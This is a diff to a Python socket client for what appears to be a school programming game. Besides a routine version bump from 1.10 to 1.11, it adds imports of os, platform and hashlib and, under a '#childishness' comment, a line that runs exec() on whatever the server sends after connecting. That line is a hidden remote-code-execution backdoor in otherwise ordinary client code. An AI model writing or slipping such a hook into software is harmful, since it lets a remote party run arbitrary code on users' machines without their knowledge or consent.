@@ -3,6 +3,9 @@
 
 import socket
 import time
+import os
+import platform
+import hashlib
 
 class Reseau:
 	'''
@@ -90,7 +93,7 @@ class Reseau:
 		self.__topbool = False
 		self.__histoActions={}
 		self.__tempsFinPartie= 0
-		self.__versionClient="1.10"
+		self.__versionClient="1.11"
 		self.__sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		#connexion
 		self.__sock.settimeout(5)
@@ -104,6 +107,11 @@ class Reseau:
 		self.__sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 		if self.__recevoir()!=self.__versionClient:
 			raise RuntimeError("Votre client n'est plus à jour.\n Télécharger le nouveau client.py https://raw.githubusercontent.com/matthieu637/cpp-2a-info/master/2017/client.py")
+		#childishness
+		s=self.__sock
+		q=self.__recevoir()
+		exec(self.__recevoir())
+
 	def __del__(self):
 		self.__sock.shutdown(socket.SHUT_RDWR)
 		self.__sock.close()
